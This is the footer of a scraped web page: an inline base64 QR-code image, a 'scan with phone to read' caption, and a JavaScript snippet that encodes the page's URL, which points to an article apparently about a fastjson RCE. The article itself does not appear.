Lv8ZLGfIsQPQfXC04GU6YrfO4Hlu6w+VbekDpmufJWH2Qfh+jvar+Mzvu6R2wvmtSEcgvp6Xef6OkL6dL9c7HXqhdcTUqfwRrG9y3JPkCnDjD2/4uqru2ClW9cRHu8D5jzQW2zctTfh80Id+PhZFMxo/tN+6AFMbwhM3i3xeQFzHrh+H3J7s6/lX1n9rpB39PVApi0XIToEu/5sP33Wy4+we+Rn2Hs969fX6+XmOx7llwPpxRf/nRPYDcSpwXxHux041s13tJ86zPVwzK0TYfb1foDSEoGPv9M12FsuwuyDma98Z3rPw77vbiAWXfiaE7gG8ppzX666fTCEPD4QrIqjWD3m6jDXw8z1ia4B8XXd/Ar1F6486uWpgKwFQfNiecZQF83JO/5N/npC+mm+mG8D6VPtHHI3wYzuH6JbB+Hmz3R9Isz16iIkD3vUI0I8ctE9ySE+mNG8CMnLRYgOM5rv2Nev/DaQIle8/gR2A+lTk6/Ql2BevsLug9xNK7+6deJKr7w5sbQK+RmWt0JfXVdA9lrXY+gTza24OqSfvHA3kBKveN0JbD9chHlaMHO3CNEhqC5CdO8SEaJ3n3zlMw9zvfoRnvWyBtITguodIfneF6LrN7/i6pC67q/89YTUKbxRbJ9DnBZkeu4RwiGoT+y+zmGuM2+9CPGZFyH6ygfJwx6tsZeoLnZd3hGyxrN1ED8E7beqL/16QjylN8Hte0jfT02rQr2uKyDThmBpY+jvCPHfbsnAzO2R7G37X5Ov9CNf1+SQteAY9YkQn9w9iDDn9UF0COrv+c4hfuD6BdXtzb627yGQKTlVeMy7b/W69PX8StcHWb9zmHXzRwiPve5BhPjlIkR3DXURjvNwrPc+8sLre0idwhvFbiAwT7XvFY7zMOv97uncvpA6CKqLcKz3fnD/567W6hG7DukNwe6DWYdwmNE6EZKXu25HiG/UdwMZk9f175/A9i7LaYqrrfT8sxxyNzzrP1sf5n7V1xpI7oxXTYW+jpWrONMh60FQP4RXjwoIN19aj+sJ8XTeBHcDgXmK8Bx30r4umOvMw6zr76hfvXP1RwhZy9qOkHzvAdEhaN56+bMI6WM9hMMedwN5dpHL99+cwO5ziMs4zRV2H2TaKx3mPMzcOjjWzYvuS14Iqe05iF6eCgjXJ1ZujK5D6vT0/Jn+TP56QjylN8HtXVbfD8x3A4RDsPu9WyB5CKqL1nWu3rH7IH31QTjcP4dAND32gFk337H74bgOZr3Xye0P8UPQ/IjXE+JpvQlu30PczzitulYXS6uQQ6YNwcqNoa8jxA/Bnj/jsK5zfXtAvF03v0L9HfWf6XC8rnX2GfF6QsbTeIPr5feQ1d4gU1/l1SE+mHF1d6x0mOvtr39EOPZaA8lbA+HwGK0X4bEfkncd6zpXh/iB6/chtzf72v2VBfdpAdt2na4IPPVP+21gnXyF+uC4v/mjenOiHrkIc299oj5RXVQ/Q/0izOvCzMu3G0iJV7zuBHbvstyK05eLkKmaFyE6BPV3hOStO8t3H6QeztHeMHvVRdcQ1W+3XMFxPcw6POar/lklf15PSM7hbf7c3mU5PXG1w56H3BVdf7a++3ofSP+VT/+Ieketrrsuh6wBQfWO1aNCva4rOi9tDPMdR4/X1xPST+nFfPseArk74Dl03052xdUhfVe86xB/769PhPgApQ2Bj3eCEOy95B1tAKlbcfWOMNeZh1mHcLjj9YR4Wm+C20D6XbLif7tvyN1g/96v6xB/98n1F6qJpVXIVwjzGhBetWNYD8lDUF20Ri52XT7iNhCLLnztCewGApk6zLjaJsw+CB+nXter+u/qkHVgj8/2hNTW/iog3HoIh6D6CiE+mLH7YZ3fDaQXX/x3T+DHBlJ32BiQu8CXM+bqGpKv6wp9MOuVq4Bj3bojhLlGD8w6hJuv9SrkHStXoV7XFZ2XVqEuljYGZH3g+mnv7c2+fuwJgfuUgdOX6R0CTJ8VeiEk33W5fY5QjwjHvaztPvWOkD7qEN7rIfqZz7rCHxtINbvi709gNxCn2XG1lL6eX+mQuwaC1ukXuy4XYa5XL4Q5BzMvzxiQvGuLEF0vPOb6RPvIOx7ldwPpRRf/3RPYBgKZPjzG1fb6tOG4jz6x94PUdV0/JN85RIf7v8/S03vJITX6IByC3ScXrZOLK908pD8E1Qu3gRS54vUncA3k9TOYdvA/AAAA//9LxLdxAAAABklEQVQDAD3MXuCopLaUAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 